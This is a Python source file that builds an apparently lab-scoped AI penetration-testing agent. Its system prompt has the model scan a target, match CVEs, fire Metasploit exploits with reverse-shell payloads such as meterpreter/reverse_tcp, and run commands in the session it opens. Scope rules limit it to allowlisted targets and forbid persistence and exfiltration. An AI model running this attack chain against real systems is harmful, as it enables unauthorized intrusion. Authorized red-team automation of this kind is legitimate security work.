import os
import sys

PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from Code_For_LLM_Server.llm_client import LLMClient, Chat
from Code_For_RTA.offensive_agent.tools_offensive import (
    red_nmap_scan,
    red_fingerprint_service,
    red_cve_lookup,
    red_search_metasploit_modules,
    red_run_exploit,
    red_list_sessions,
    red_execute_in_session,
    red_full_attack_chain,
)

RED_TEAM_SYSTEM_PROMPT = """You are a Red Team penetration-testing agent running against authorized lab targets.

Your objective, when given a target, is to land a reverse shell by chaining these tools:

  1. red_nmap_scan(target, ports) - discover open ports and services.
  2. red_fingerprint_service(host, port) - extract exact product:version for any port that looks exploitable.
  3. red_cve_lookup(vendor_product_version) - fetch known CVEs for that product version.
  4. red_search_metasploit_modules(query) - find MSF exploit modules for the CVEs you care about.
  5. red_run_exploit(module, rhost, rport, payload, lhost, lport, extra_options_json) - fire the exploit.
  6. red_list_sessions() - confirm a session was opened.
  7. red_execute_in_session(session_id, command) - run a couple of quick commands (id, uname -a) to prove access.

Alternative: red_full_attack_chain(target, lhost, lport) runs steps 1-4 in one shot and returns a JSON report;
use it for rapid triage, then still call red_run_exploit explicitly.

Rules:
- Only touch the target provided by the user. The tools enforce an allowlist; if you get an out-of-scope error, stop.
- Pick payload architecture based on the OS/service (linux/x64/meterpreter/reverse_tcp for Linux HTTP services,
  windows/x64/meterpreter/reverse_tcp for Windows SMB, cmd/unix/reverse for generic *nix, etc.).
- Prefer exploit modules with rank "excellent" or "great" and disclosure dates that match the CVE.
- Once a session is open, run 1-2 identification commands and report. Do not persist, pivot, or exfiltrate.
- If no exploitable service is found, report that clearly and stop.

Return a final plain-text summary covering: services found, CVEs matched, module chosen, session outcome.
"""


class RedTeamAgent:
    def __init__(self, lhost: str, lport: int):
        self.lhost = lhost
        self.lport = lport
        self.model = LLMClient()
        self.chat = Chat(RED_TEAM_SYSTEM_PROMPT)
        self.tools = [
            red_nmap_scan,
            red_fingerprint_service,
            red_cve_lookup,
            red_search_metasploit_modules,
            red_run_exploit,
            red_list_sessions,
            red_execute_in_session,
            red_full_attack_chain,
        ]

    def run(self, target: str) -> str | None:
        instruction = (
            f"Target: {target}\n"
            f"Reverse-shell listener: LHOST={self.lhost} LPORT={self.lport}\n"
            f"Enumerate the target, identify a vulnerable service, exploit it, and prove access."
        )
        self.chat.add_user_message(instruction)
        return self.model.act(
            self.chat,
            self.tools,
            on_content=lambda c: print(c, end="", flush=True),
        )
